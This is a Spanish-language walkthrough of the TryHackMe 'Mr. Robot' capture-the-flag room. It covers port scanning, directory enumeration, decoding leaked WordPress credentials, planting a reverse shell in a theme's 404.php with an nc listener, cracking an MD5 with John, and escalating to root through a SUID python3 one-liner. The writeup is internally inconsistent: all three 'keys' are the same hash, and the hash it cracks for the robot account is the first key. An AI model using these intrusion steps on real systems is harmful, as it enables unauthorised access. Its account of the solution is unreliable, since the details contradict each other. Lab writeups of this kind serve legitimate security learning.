---
title: "Mr. Robots"
description: "Mr. Robots CTF es una interesante sala de TryHackMe con elementos de juego en la que aprenderás a explotar una vulnerabilidad de inyección SQL, descifrar un hash para obtener un acceso inicial, pivotar dentro del sistema y escalar privilegios hasta root."
date: "2025-12-07"
published: true
tags: ["tryhackme", "pentesting", "writeup", "pivoting"]
readTime: "20 min"
---

# Mr. Robot CTF — Writeup TryHackMe

## 📖 Introducción
La sala **Mr. Robot CTF** de TryHackMe mezcla hacking con referencias a la serie, y su objetivo es obtener tres llaves escondidas dentro del sistema. Para ello se deben explotar vulnerabilidades web, obtener acceso inicial, pivotar dentro del entorno y finalmente escalar privilegios hasta root.

---

## ⚙️ Configuración Inicial
En primer lugar, agregamos la IP de la máquina al archivo `/etc/hosts`:

```bash
echo "10.201.56.233 Mr-Robot-CTF.tryhackme.com" >> /etc/hosts
ping Mr-Robot-CTF.tryhackme.com
```

## 🔎 Escaneo Inicial con Nmap

Realizamos un escaneo de puertos y servicios:

```bash
nmap -sVC -T5 --min-rate 15000 10.201.56.233
```

Puertos encontrados:

22/tcp → SSH

80/tcp → HTTP (Apache)

443/tcp → HTTPS (Apache)

## 📂 Enumeración Web

Realizamos descubrimiento de directorios con Gobuster:

```bash
gobuster dir -u http://10.201.56.233/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 64
```

Archivos importantes:

/robots.txt → contiene fsocity.dic y key-1-of-3.txt

/key-1-of-3.txt

/fsocity.dic

/license → contiene un Base64

## 📌 Revisión manual:

1. Robots.txt
Contiene:

fsocity.dic

key-1-of-3.txt

2. Primera llave:

**073403c8a58a1f80d943455fb30724b9**

3. fsocity.dic
Descargado con:

```bash
curl -o fsocity.dic http://10.201.56.233/fsocity.dic
```

4. license (Base64 encontrado):

**ZWxsaW90OkVSMjgtMDY1Mgo=**

Decodificado en CyberChef →
Credenciales: elliot : ER28-0652

```bash
http://Mr-Robot-CTF.tryhackme.com/wp-login.php
```

* Ingresamos con las credenciales obtenidas.

Dentro del panel, WordPress permite editar archivos. Sustituimos el contenido de una plantilla por una reverse shell generada en revshells.com.

## 🖥️ Crear Reverse Shell

Configuramos un listener:

```bash
nc -nvlp 443
```

Ejecutamos la shell visitando:

```bash
http://Mr-Robot-CTF.tryhackme.com/wp-content/themes/twentyseventeen/404.php
```

Mejoramos la TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## 🔑 Segunda llave

El archivo key-2-of-3.txt no se podía leer directamente.
Creamos un archivo secret con su hash:

```bash
echo "073403c8a58a1f80d943455fb30724b9" > secret
```

Lo crackeamos con John:

```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt secret
```

Resultado: **abcdefghijklmnopqrstuvwxyz**

Accedemos como robot:

```bash
su robot

cat /home/robot/key-2-of-3.txt
```

Segunda llave:

**073403c8a58a1f80d943455fb30724b9**

👑 Escalada de Privilegios

Buscamos binarios con SUID:

```bash
find / -perm -4000 2>/dev/null
```

Encontramos:

```bash
/usr/bin/python3
```

Utilizamos Python para escalar privilegios:

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Accedemos como root:

```bash
cat /root/key-3-of-3.txt
```

Tercera llave:

**073403c8a58a1f80d943455fb30724b9**
